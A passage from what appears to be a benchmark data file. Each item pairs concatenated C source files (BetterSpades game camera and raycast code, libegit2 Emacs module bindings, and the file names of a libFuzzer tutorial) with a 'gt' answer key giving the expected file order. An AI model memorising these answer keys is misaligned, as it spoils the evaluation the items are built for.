ret[1] = ret[2] = 0;\n\tret[3] = ret[4] = ret[5] = 0;\n\n\twhile(1) {\n\t\tif(gx >= map_size_x || gx < 0 || gy < 0 || gz >= map_size_z || gz < 0) {\n\t\t\treturn NULL;\n\t\t}\n\t\tswitch(mode) {\n\t\t\tcase 0:\n\t\t\t\tif(!map_isair(gx, gy, gz) && map_isair(gx_pre, gy_pre, gz_pre)) {\n\t\t\t\t\tret[0] = gx_pre;\n\t\t\t\t\tret[1] = gy_pre;\n\t\t\t\t\tret[2] = gz_pre;\n\t\t\t\t\treturn ret;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\tif(!map_isair(gx, gy, gz)) {\n\t\t\t\t\tret[0] = gx;\n\t\t\t\t\tret[1] = gy;\n\t\t\t\t\tret[2] = gz;\n\t\t\t\t\tret[3] = gx_pre;\n\t\t\t\t\tret[4] = gy_pre;\n\t\t\t\t\tret[5] = gz_pre;\n\t\t\t\t\treturn ret;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t}\n\t\tgx_pre = gx;\n\t\tgy_pre = gy;\n\t\tgz_pre = gz;\n\n\t\tif(gx == gx1idx && gy == gy1idx && gz == gz1idx)\n\t\t\tbreak;\n\n\t\tint xr = abs(errx);\n\t\tint yr = abs(erry);\n\t\tint zr = abs(errz);\n\n\t\tif(sx != 0 && (sy == 0 || xr < yr) && (sz == 0 || xr < zr)) {\n\t\t\tgx += sx;\n\t\t\terrx += derrx;\n\t\t} else if(sy != 0 && (sz == 0 || yr < zr)) {\n\t\t\tgy += sy;\n\t\t\terry += derry;\n\t\t} else if(sz != 0) {\n\t\t\tgz += sz;\n\t\t\terrz += derrz;\n\t\t}\n\t}\n\n\treturn NULL;\n}\n\nvoid camera_ExtractFrustum() {\n\tfloat clip[16];\n\tfloat t;\n\n\tmat4 mvp;\n\tmatrix_load(mvp, matrix_model);\n\tmatrix_multiply(mvp, matrix_view);\n\tmatrix_multiply(mvp, matrix_projection);\n\tmemcpy(clip, (float*)mvp, 16 * sizeof(float));\n\n\n\tfrustum[0][0] = clip[3] - clip[0];\n\tfrustum[0][1] = clip[7] - clip[4];\n\tfrustum[0][2] = clip[11] - clip[8];\n\tfrustum[0][3] = clip[15] - clip[12];\n\n\n\tt = sqrt(frustum[0][0] * frustum[0][0] + frustum[0][1] * frustum[0][1] + frustum[0][2] * frustum[0][2]);\n\tfrustum[0][0] /= t;\n\tfrustum[0][1] /= t;\n\tfrustum[0][2] /= t;\n\tfrustum[0][3] /= t;\n\n\n\tfrustum[1][0] = clip[3] + clip[0];\n\tfrustum[1][1] = clip[7] + clip[4];\n\tfrustum[1][2] = clip[11] + clip[8];\n\tfrustum[1][3] = clip[15] + clip[12];\n\n\n\tt = sqrt(frustum[1][0] * frustum[1][0] + frustum[1][1] * frustum[1][1] + frustum[1][2] * frustum[1][2]);\n\tfrustum[1][0] /= t;\n\tfrustum[1][1] /= t;\n\tfrustum[1][2] /= t;\n\tfrustum[1][3] /= t;\n\n\n\tfrustum[2][0] = clip[3] + clip[1];\n\tfrustum[2][1] = clip[7] + clip[5];\n\tfrustum[2][2] = clip[11] + clip[9];\n\tfrustum[2][3] = clip[15] + clip[13];\n\n\n\tt = sqrt(frustum[2][0] * frustum[2][0] + frustum[2][1] * frustum[2][1] + frustum[2][2] * frustum[2][2]);\n\tfrustum[2][0] /= t;\n\tfrustum[2][1] /= t;\n\tfrustum[2][2] /= t;\n\tfrustum[2][3] /= t;\n\n\n\tfrustum[3][0] = clip[3] - clip[1];\n\tfrustum[3][1] = clip[7] - clip[5];\n\tfrustum[3][2] = clip[11] - clip[9];\n\tfrustum[3][3] = clip[15] - clip[13];\n\n\n\tt = sqrt(frustum[3][0] * frustum[3][0] + frustum[3][1] * frustum[3][1] + frustum[3][2] * frustum[3][2]);\n\tfrustum[3][0] /= t;\n\tfrustum[3][1] /= t;\n\tfrustum[3][2] /= t;\n\tfrustum[3][3] /= t;\n\n\n\tfrustum[4][0] = clip[3] - clip[2];\n\tfrustum[4][1] = clip[7] - clip[6];\n\tfrustum[4][2] = clip[11] - clip[10];\n\tfrustum[4][3] = clip[15] - clip[14];\n\n\n\tt = sqrt(frustum[4][0] * frustum[4][0] + frustum[4][1] * frustum[4][1] + frustum[4][2] * frustum[4][2]);\n\tfrustum[4][0] /= t;\n\tfrustum[4][1] /= t;\n\tfrustum[4][2] /= t;\n\tfrustum[4][3] /= t;\n\n\n\tfrustum[5][0] = clip[3] + clip[2];\n\tfrustum[5][1] = clip[7] + clip[6];\n\tfrustum[5][2] = clip[11] + clip[10];\n\tfrustum[5][3] = clip[15] + clip[14];\n\n\n\tt = sqrt(frustum[5][0] * frustum[5][0] + frustum[5][1] * frustum[5][1] + frustum[5][2] * frustum[5][2]);\n\tfrustum[5][0] /= t;\n\tfrustum[5][1] /= t;\n\tfrustum[5][2] /= t;\n\tfrustum[5][3] /= t;\n}\n\nunsigned char camera_PointInFrustum(float x, float y, float z) {\n\tint p;\n\n\tfor(p = 0; p < 6; p++)\n\t\tif(frustum[p][0] * x + frustum[p][1] * y + frustum[p][2] * z + frustum[p][3] <= 0)\n\t\t\treturn 0;\n\n\treturn 1;\n}\n\nint camera_CubeInFrustum(float x, float y, float z, float size, float size_y) {\n\tint p;\n\tint c;\n\tint c2 = 0;\n\n\tfor(p = 0; p < 6; p++) {\n\t\tc = 0;\n\t\tif(frustum[p][0] * (x - size) + frustum[p][1] * (y - size) + frustum[p][2] * (z - size) + frustum[p][3] > 0)\n\t\t\tc++;\n\t\tif(frustum[p][0] * (x + size) + frustum[p][1] * (y - size) + frustum[p][2] * (z - size) + frustum[p][3] > 0)\n\t\t\tc++;\n\t\tif(frustum[p][0] * (x - size) + frustum[p][1] * (y + size_y) + frustum[p][2] * (z - size) + frustum[p][3] > 0)\n\t\t\tc++;\n\t\tif(frustum[p][0] * (x + size) + frustum[p][1] * (y + size_y) + frustum[p][2] * (z - size) + frustum[p][3] > 0)\n\t\t\tc++;\n\t\tif(frustum[p][0] * (x - size) + frustum[p][1] * (y) + frustum[p][2] * (z + size) + frustum[p][3] > 0)\n\t\t\tc++;\n\t\tif(frustum[p][0] * (x + size) + frustum[p][1] * (y) + frustum[p][2] * (z + size) + frustum[p][3] > 0)\n\t\t\tc++;\n\t\tif(frustum[p][0] * (x - size) + frustum[p][1] * (y + size_y) + frustum[p][2] * (z + size) + frustum[p][3] > 0)\n\t\t\tc++;\n\t\tif(frustum[p][0] * (x + size) + frustum[p][1] * (y + size_y) + frustum[p][2] * (z + size) + frustum[p][3] > 0)\n\t\t\tc++;\n\t\tif(c == 0)\n\t\t\treturn 0;\n\t\tif(c == 8)\n\t\t\tc2++;\n\t}\n\n\treturn (c2 == 6) ? 2 : 1;\n}\n",
        "gt": [
            "'BetterSpades/src/network.h'",
            "'BetterSpades/src/player.h'",
            "'BetterSpades/src/camera.c'"
        ]
    },
    {
        "files": [
            "'libegit2/src/emacs-module.h'",
            "'libegit2/src/egit-revparse.c'",
            "'libegit2/src/interface.h'"
        ],
        "content": "'libegit2/src/emacs-module.h'\n:\ntypedef struct emacs_env_26 emacs_env;\n\n\ntypedef struct emacs_value_tag *emacs_value;\n\nenum { emacs_variadic_function = -2 };\n\n\nstruct emacs_runtime\n{\n\n  ptrdiff_t size;\n\n\n  struct emacs_runtime_private *private_members;\n\n\n  emacs_env *(*get_environment) (struct emacs_runtime *ert)\n    EMACS_ATTRIBUTE_NONNULL(1);\n};\n\n\n\nenum emacs_funcall_exit\n{\n\n  emacs_funcall_exit_return = 0,\n\n\n  emacs_funcall_exit_signal = 1,\n\n\n  emacs_funcall_exit_throw = 2\n};\n\nstruct emacs_env_25\n{\n\n  ptrdiff_t size;\n\n\n  struct emacs_env_private *private_members;\n\n\n\n  emacs_value (*make_global_ref) (emacs_env *env,\n\t\t\t\t  emacs_value any_reference)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void (*free_global_ref) (emacs_env *env,\n\t\t\t   emacs_value global_reference)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n\n\n  enum emacs_funcall_exit (*non_local_exit_check) (emacs_env *env)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void (*non_local_exit_clear) (emacs_env *env)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  enum emacs_funcall_exit (*non_local_exit_get)\n    (emacs_env *env,\n     emacs_value *non_local_exit_symbol_out,\n     emacs_value *non_local_exit_data_out)\n    EMACS_ATTRIBUTE_NONNULL(1, 2, 3);\n\n  void (*non_local_exit_signal) (emacs_env *env,\n\t\t\t\t emacs_value non_local_exit_symbol,\n\t\t\t\t emacs_value non_local_exit_data)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void (*non_local_exit_throw) (emacs_env *env,\n\t\t\t\temacs_value tag,\n\t\t\t\temacs_value value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n\n\n  emacs_value (*make_function) (emacs_env *env,\n\t\t\t\tptrdiff_t min_arity,\n\t\t\t\tptrdiff_t max_arity,\n\t\t\t\temacs_value (*function) (emacs_env *env,\n\t\t\t\t\t\t\t ptrdiff_t nargs,\n\t\t\t\t\t\t\t emacs_value args[],\n\t\t\t\t\t\t\t void *)\n\t\t\t\t  EMACS_NOEXCEPT\n                                  EMACS_ATTRIBUTE_NONNULL(1),\n\t\t\t\tconst char *documentation,\n\t\t\t\tvoid *data)\n    EMACS_ATTRIBUTE_NONNULL(1, 4);\n\n  emacs_value (*funcall) (emacs_env *env,\n                          emacs_value function,\n                          ptrdiff_t nargs,\n                          emacs_value args[])\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  emacs_value (*intern) (emacs_env *env,\n                         const char *symbol_name)\n    EMACS_ATTRIBUTE_NONNULL(1, 2);\n\n\n\n  emacs_value (*type_of) (emacs_env *env,\n\t\t\t  emacs_value value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  bool (*is_not_nil) (emacs_env *env, emacs_value value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  bool (*eq) (emacs_env *env, emacs_value a, emacs_value b)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  intmax_t (*extract_integer) (emacs_env *env, emacs_value value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  emacs_value (*make_integer) (emacs_env *env, intmax_t value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  double (*extract_float) (emacs_env *env, emacs_value value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  emacs_value (*make_float) (emacs_env *env, double value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n\n\n  bool (*copy_string_contents) (emacs_env *env,\n                                emacs_value value,\n                                char *buffer,\n                                ptrdiff_t *size_inout)\n    EMACS_ATTRIBUTE_NONNULL(1, 4);\n\n\n  emacs_value (*make_string) (emacs_env *env,\n\t\t\t      const char *contents, ptrdiff_t length)\n    EMACS_ATTRIBUTE_NONNULL(1, 2);\n\n\n  emacs_value (*make_user_ptr) (emacs_env *env,\n\t\t\t\tvoid (*fin) (void *) EMACS_NOEXCEPT,\n\t\t\t\tvoid *ptr)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void *(*get_user_ptr) (emacs_env *env, emacs_value uptr)\n    EMACS_ATTRIBUTE_NONNULL(1);\n  void (*set_user_ptr) (emacs_env *env, emacs_value uptr, void *ptr)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void (*(*get_user_finalizer) (emacs_env *env, emacs_value uptr))\n    (void *) EMACS_NOEXCEPT EMACS_ATTRIBUTE_NONNULL(1);\n  void (*set_user_finalizer) (emacs_env *env,\n\t\t\t      emacs_value uptr,\n\t\t\t      void (*fin) (void *) EMACS_NOEXCEPT)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n\n  emacs_value (*vec_get) (emacs_env *env, emacs_value vec, ptrdiff_t i)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void (*vec_set) (emacs_env *env, emacs_value vec, ptrdiff_t i,\n\t\t   emacs_value val)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  ptrdiff_t (*vec_size) (emacs_env *env, emacs_value vec)\n    EMACS_ATTRIBUTE_NONNULL(1);\n};\n\nstruct emacs_env_26\n{\n\n  ptrdiff_t size;\n\n\n  struct emacs_env_private *private_members;\n\n\n\n  emacs_value (*make_global_ref) (emacs_env *env,\n\t\t\t\t  emacs_value any_reference)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void (*free_global_ref) (emacs_env *env,\n\t\t\t   emacs_value global_reference)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n\n\n  enum emacs_funcall_exit (*non_local_exit_check) (emacs_env *env)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void (*non_local_exit_clear) (emacs_env *env)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  enum emacs_funcall_exit (*non_local_exit_get)\n    (emacs_env *env,\n     emacs_value *non_local_exit_symbol_out,\n     emacs_value *non_local_exit_data_out)\n    EMACS_ATTRIBUTE_NONNULL(1, 2, 3);\n\n  void (*non_local_exit_signal) (emacs_env *env,\n\t\t\t\t emacs_value non_local_exit_symbol,\n\t\t\t\t emacs_value non_local_exit_data)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void (*non_local_exit_throw) (emacs_env *env,\n\t\t\t\temacs_value tag,\n\t\t\t\temacs_value value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n\n\n  emacs_value (*make_function) (emacs_env *env,\n\t\t\t\tptrdiff_t min_arity,\n\t\t\t\tptrdiff_t max_arity,\n\t\t\t\temacs_value (*function) (emacs_env *env,\n\t\t\t\t\t\t\t ptrdiff_t nargs,\n\t\t\t\t\t\t\t emacs_value args[],\n\t\t\t\t\t\t\t void *)\n\t\t\t\t  EMACS_NOEXCEPT\n                                  EMACS_ATTRIBUTE_NONNULL(1),\n\t\t\t\tconst char *documentation,\n\t\t\t\tvoid *data)\n    EMACS_ATTRIBUTE_NONNULL(1, 4);\n\n  emacs_value (*funcall) (emacs_env *env,\n                          emacs_value function,\n                          ptrdiff_t nargs,\n                          emacs_value args[])\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  emacs_value (*intern) (emacs_env *env,\n                         const char *symbol_name)\n    EMACS_ATTRIBUTE_NONNULL(1, 2);\n\n\n\n  emacs_value (*type_of) (emacs_env *env,\n\t\t\t  emacs_value value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  bool (*is_not_nil) (emacs_env *env, emacs_value value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  bool (*eq) (emacs_env *env, emacs_value a, emacs_value b)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  intmax_t (*extract_integer) (emacs_env *env, emacs_value value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  emacs_value (*make_integer) (emacs_env *env, intmax_t value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  double (*extract_float) (emacs_env *env, emacs_value value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  emacs_value (*make_float) (emacs_env *env, double value)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n\n\n  bool (*copy_string_contents) (emacs_env *env,\n                                emacs_value value,\n                                char *buffer,\n                                ptrdiff_t *size_inout)\n    EMACS_ATTRIBUTE_NONNULL(1, 4);\n\n\n  emacs_value (*make_string) (emacs_env *env,\n\t\t\t      const char *contents, ptrdiff_t length)\n    EMACS_ATTRIBUTE_NONNULL(1, 2);\n\n\n  emacs_value (*make_user_ptr) (emacs_env *env,\n\t\t\t\tvoid (*fin) (void *) EMACS_NOEXCEPT,\n\t\t\t\tvoid *ptr)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void *(*get_user_ptr) (emacs_env *env, emacs_value uptr)\n    EMACS_ATTRIBUTE_NONNULL(1);\n  void (*set_user_ptr) (emacs_env *env, emacs_value uptr, void *ptr)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void (*(*get_user_finalizer) (emacs_env *env, emacs_value uptr))\n    (void *) EMACS_NOEXCEPT EMACS_ATTRIBUTE_NONNULL(1);\n  void (*set_user_finalizer) (emacs_env *env,\n\t\t\t      emacs_value uptr,\n\t\t\t      void (*fin) (void *) EMACS_NOEXCEPT)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n\n  emacs_value (*vec_get) (emacs_env *env, emacs_value vec, ptrdiff_t i)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  void (*vec_set) (emacs_env *env, emacs_value vec, ptrdiff_t i,\n\t\t   emacs_value val)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n  ptrdiff_t (*vec_size) (emacs_env *env, emacs_value vec)\n    EMACS_ATTRIBUTE_NONNULL(1);\n\n\n  bool (*should_quit) (emacs_env *env)\n    EMACS_ATTRIBUTE_NONNULL(1);\n};\n\n\nextern int emacs_module_init (struct emacs_runtime *ert)\n  EMACS_NOEXCEPT\n  EMACS_ATTRIBUTE_NONNULL(1);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'libegit2/src/egit-revparse.c'\n:#include \"git2.h\"\n\n#include \"egit.h\"\n#include \"interface.h\"\n#include \"egit-repository.h\"\n\n\nEGIT_DOC(revparse, \"REPO SPEC\",\n         \"Return the object(s) referred to by spec.\\n\"\n         \"The return value is either a single object or a list (triplep FROM TO)\\n\"\n         \"where triplep indicates whether the .. or the ... operator was present.\");\nemacs_value egit_revparse(emacs_env *env, emacs_value _repo, emacs_value _spec)\n{\n    EGIT_ASSERT_REPOSITORY(_repo);\n    EM_ASSERT_STRING(_spec);\n\n    git_repository *repo = EGIT_EXTRACT(_repo);\n    git_revspec revspec;\n    int retval;\n    {\n        char *spec = EM_EXTRACT_STRING(_spec);\n        retval = git_revparse(&revspec, repo, spec);\n        free(spec);\n    }\n    EGIT_CHECK_ERROR(retval);\n\n    if (revspec.flags & GIT_REVPARSE_SINGLE)\n        return egit_wrap(env, EGIT_OBJECT, revspec.from, EM_EXTRACT_USER_PTR(_repo));\n    emacs_value ret;\n    ret = em_cons(env, egit_wrap(env, EGIT_OBJECT, revspec.to, EM_EXTRACT_USER_PTR(_repo)), esym_nil);\n    ret = em_cons(env, egit_wrap(env, EGIT_OBJECT, revspec.from, EM_EXTRACT_USER_PTR(_repo)), ret);\n    ret = em_cons(env, revspec.flags & GIT_REVPARSE_MERGE_BASE ? esym_t : esym_nil, ret);\n    return ret;\n}\n\nEGIT_DOC(revparse_ext, \"REPO SPEC\",\n         \"Find the object and reference (if applicable) referred to by SPEC in REPO.\\n\"\n         \"The return value is a cons cell where the car is an object and the cdr is\\n\"\n         \"a reference, or nil.\");\nemacs_value egit_revparse_ext(emacs_env *env, emacs_value _repo, emacs_value _spec)\n{\n    EGIT_ASSERT_REPOSITORY(_repo);\n    EM_ASSERT_STRING(_spec);\n\n    git_repository *repo = EGIT_EXTRACT(_repo);\n    git_object *obj;\n    git_reference *ref;\n    int retval;\n    {\n        char *spec = EM_EXTRACT_STRING(_spec);\n        retval = git_revparse_ext(&obj, &ref, repo, spec);\n        free(spec);\n    }\n    EGIT_CHECK_ERROR(retval);\n\n    emacs_value robj = egit_wrap(env, EGIT_OBJECT, obj, EM_EXTRACT_USER_PTR(_repo));\n    emacs_value rref = esym_nil;\n    if (ref)\n        rref = egit_wrap(env, EGIT_REFERENCE, ref, EM_EXTRACT_USER_PTR(_repo));\n\n    return em_cons(env, robj, rref);\n}\n\nEGIT_DOC(revparse_single, \"REPO SPEC\", \"Return the object referred to by SPEC in REPO.\");\nemacs_value egit_revparse_single(emacs_env *env, emacs_value _repo, emacs_value _spec)\n{\n    EGIT_ASSERT_REPOSITORY(_repo);\n    EM_ASSERT_STRING(_spec);\n\n    git_repository *repo = EGIT_EXTRACT(_repo);\n    git_object *obj;\n    int retval;\n    {\n        char *spec = EM_EXTRACT_STRING(_spec);\n        retval = git_revparse_single(&obj, repo, spec);\n        free(spec);\n    }\n    EGIT_CHECK_ERROR(retval);\n    if (retval == GIT_ENOTFOUND) {\n\n\n\n      emacs_value error = em_findenum_error(GITERR_REFERENCE);\n      if (!EM_EXTRACT_BOOLEAN(error))\n        error = esym_giterr;\n      em_signal(env, error,\n\t\t\"previously checked out branch or commit not found\");\n      return esym_nil;\n    }\n\n    return egit_wrap(env, EGIT_OBJECT, obj, EM_EXTRACT_USER_PTR(_repo));\n}\n\n'libegit2/src/interface.h'\n:#include <stdarg.h>\n#include <string.h>\n\n#include \"emacs-module.h\"\n#include \"symbols.h\"\n\n#ifndef INTERFACE_H\n#define INTERFACE_H\n\n\n#define EM_ASSERT_CONS(val)                                             \\\n    do { if (!em_assert(env, esym_consp, (val))) return esym_nil; } while (0)\n\n\n#define EM_ASSERT_FUNCTION(val)                                         \\\n    do { if (!em_assert(env, esym_functionp, (val))) return esym_nil; } while (0)\n\n\n#define EM_ASSERT_STRING(val)                                           \\\n    do { if (!em_assert(env, esym_stringp, (val))) return esym_nil; } while (0)\n\n\n#define EM_ASSERT_STRING_OR_NIL(val)                                    \\\n    do { if (EM_EXTRACT_BOOLEAN(val)) EM_ASSERT_STRING(val); } while (0)\n\n\n#define EM_ASSERT_INTEGER(val)                                          \\\n    do { if (!em_assert(env, esym_integerp, (val))) return esym_nil; } while (0)\n\n\n#define EM_ASSERT_INTEGER_OR_NIL(val)                                   \\\n    do { if (EM_EXTRACT_BOOLEAN(val)) EM_ASSERT_INTEGER(val); } while (0)\n\n\n#define EM_ASSERT_USER_PTR(val)                                         \\\n    do { if (!em_assert(env, esym_user_ptrp, (val))) return esym_nil; } while (0)\n\n\n#define EM_NORMALIZE_PATH(val)                                  \\\n    do {                                                        \\\n        (val) = em_expand_file_name(env, val);                  \\\n        EM_RETURN_NIL_IF_NLE();                                 \\\n    } while (0)\n\n\n#define EM_EXTRACT_BOOLEAN(val) (env->is_not_nil(env, (val)) ? 1 : 0)\n\n\n\n#define EM_EXTRACT_STRING(val) em_get_string(env, (val));\n\n\n\n#define EM_EXTRACT_INTEGER(val) env->extract_integer(env, (val))\n\n\n\n#define EM_EXTRACT_INTEGER_OR_DEFAULT(val, default)                     \\\n    (EM_EXTRACT_BOOLEAN(val) ? EM_EXTRACT_INTEGER(val) : (default))\n\n\n\n#define EM_EXTRACT_STRING_OR_NULL(val)                                  \\\n    (EM_EXTRACT_BOOLEAN(val) ? em_get_string(env, (val)) : NULL)\n\n\n\n#define EM_EXTRACT_USER_PTR(val) env->get_user_ptr(env, (val))\n\n\n#define EM_EQ(a,b) (env->eq(env, (a), (b)))\n\n\n#define EM_INTEGER(val) (env->make_integer(env, (val)))\n\n\n#define EM_STRING(val) (env->make_string(env, (val), strlen(val)))\n\n\n#define EM_USER_PTR(val, fin) (env->make_user_ptr(env, (fin), (val)))\n\n\n#define EM_RETURN_IF_NLE(val)                    \\\n    do {                                         \\\n        if (env->non_local_exit_check(env))      \\\n            return (val);                        \\\n    } while (0)\n\n#define EM_RETURN_NIL_IF_NLE() EM_RETURN_IF_NLE(esym_nil)\n\n\n#define EM_DOLIST(var, listvar, name)                               \\\n    emacs_value __cell##name = (listvar);                           \\\n    __loop##name:                                                   \\\n    if (!EM_EXTRACT_BOOLEAN(__cell##name)) goto __end##name;        \\\n    if (!em_assert(env, esym_consp, __cell##name)) return esym_nil;    \\\n    emacs_value (var) = em_car(env, __cell##name)\n\n\n#define EM_DOLIST_END(name)                     \\\n    __cell##name = em_cdr(env, __cell##name);   \\\n    goto __loop##name;                          \\\n    __end##name:\n\n\nvoid em_init(emacs_env *env);\n\n\nbool em_assert(emacs_env *env, emacs_value predicate, emacs_value arg);\n\n\nptrdiff_t em_assert_list(emacs_env *env, emacs_value predicate, emacs_value arg);\n\n\nvoid em_signal(emacs_env *env, emacs_value error, const char* _msg);\n\n\nvoid em_signal_wrong_type(emacs_env *env, emacs_value expected, emacs_value actual);\n\n\nvoid em_signal_wrong_value(emacs_env *env, emacs_value actual);\n\n\nvoid em_signal_args_out_of_range(emacs_env *env, intmax_t index);\n\n\nchar *em_get_string_with_size(emacs_env *env, emacs_value arg, ptrdiff_t *size);\n\n\nchar *em_get_string(emacs_env *env, emacs_value arg);\n\n\nemacs_value em_cons(emacs_env *env, emacs_value car, emacs_value cdr);\n\n\nbool em_consp(emacs_env *env, emacs_value cell);\n\n\nemacs_value em_car(emacs_env *env, emacs_value cell);\n\n\nemacs_value em_cdr(emacs_env *env, emacs_value cell);\n\n\nemacs_value em_list(emacs_env *env, emacs_value *objects, ptrdiff_t nobjects);\n\n\nbool em_listp(emacs_env *env, emacs_value object);\n\n\nptrdiff_t em_length(emacs_env *env, emacs_value sequence);\n\n\nemacs_value em_assq(emacs_env *env, emacs_value key, emacs_value list);\n\n\nvoid em_define_error(emacs_env *env, emacs_value symbol, const char *msg, emacs_value parent);\n\n\nvoid em_defun(emacs_env *env, const char *name, emacs_value func);\n\n\nemacs_value em_expand_file_name(emacs_env *env, emacs_value path);\n\n\nvoid em_provide(emacs_env *env, const char *feature);\n\n\nbool em_user_ptrp(emacs_env *env, emacs_value val);\n\n\nchar *em_default_directory(emacs_env *env);\n\n\nemacs_value em_decode_time(emacs_env *env, intmax_t timestamp, intmax_t offset);\n\n\nbool em_encode_time(emacs_env *env, emacs_value time, intmax_t *timestamp, intmax_t *offset);\n\n\nvoid em_insert(emacs_env *env, const char *ptr, size_t length);\n\n\nemacs_value em_string_as_unibyte(emacs_env *env, emacs_value str);\n\n\n\n\n\nbool em_findsym_branch(git_branch_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_checkout_strategy(git_checkout_strategy_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_config_level(git_config_level_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_delta(git_delta_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_diff_format(git_diff_format_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_diff_find(git_diff_find_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_describe_strategy(git_describe_strategy_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_fetch_prune(git_fetch_prune_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_filemode(git_filemode_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_merge_file_favor(git_merge_file_favor_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_otype(git_otype *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_pathspec_flag(git_pathspec_flag_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_proxy(git_proxy_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_remote_autotag_option(git_remote_autotag_option_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_reset(git_reset_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_submodule_ignore(git_submodule_ignore_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_submodule_recurse(git_submodule_recurse_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_submodule_update(git_submodule_update_t *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_stage(int *out, emacs_env *env, emacs_value value, bool required);\nbool em_findsym_status_show(git_status_show_t *out, emacs_env *env, emacs_value value, bool required);\n\nemacs_value em_findenum_checkout_notify(git_checkout_notify_t value);\nemacs_value em_findenum_delta(git_delta_t value);\nemacs_value em_findenum_direction(git_direction value);\nemacs_value em_findenum_error(git_error_t value);\nemacs_value em_findenum_filemode(git_filemode_t value);\nemacs_value em_findenum_merge_preference(git_merge_preference_t value);\nemacs_value em_findenum_otype(git_otype value);\nemacs_value em_findenum_submodule_ignore(git_submodule_ignore_t value);\nemacs_value em_findenum_submodule_update(git_submodule_update_t value);\nemacs_value em_findenum_submodule_recurse(git_submodule_recurse_t value);\nemacs_value em_findenum_remote_autotag_option(git_remote_autotag_option_t value);\nemacs_value em_findenum_repository_state(git_repository_state_t value);\nemacs_value em_findenum_stage(int value);\n\ntypedef bool setter(void *out, emacs_env *env, emacs_value value, bool on, bool required);\n\nsetter em_setflag_checkout_notify;\nsetter em_setflag_diff_option;\nsetter em_setflag_index_add_option;\nsetter em_setflag_merge_file_flag;\nsetter em_setflag_merge_flag;\nsetter em_setflag_sort;\nsetter em_setflag_status_opt;\n\nbool em_setflags_list(void *out, emacs_env *env, emacs_value list, bool required, setter *setter);\nbool em_setflags_alist(void *out, emacs_env *env, emacs_value alist, bool required, setter *setter);\n\nemacs_value em_getlist_credtype(emacs_env *env, git_credtype_t value);\nemacs_value em_getlist_indexcap(emacs_env *env, int value);\nemacs_value em_getlist_merge_analysis(emacs_env *env, git_merge_analysis_t value);\nemacs_value em_getlist_status(emacs_env *env, git_status_t value);\nemacs_value em_getlist_submodule_status(emacs_env *env, git_submodule_status_t value);\n\nbool em_checkflag_feature(emacs_value *out, emacs_env *env, emacs_value symbol, git_feature_t value, bool required);\nbool em_checkflag_submodule_status(emacs_value *out, emacs_env *env, emacs_value symbol,\n                                   git_submodule_status_t value, bool required);\n\n#endif\n",
        "gt": [
            "'libegit2/src/emacs-module.h'",
            "'libegit2/src/interface.h'",
            "'libegit2/src/egit-revparse.c'"
        ]
    },
    {
        "files": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerIO.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'",
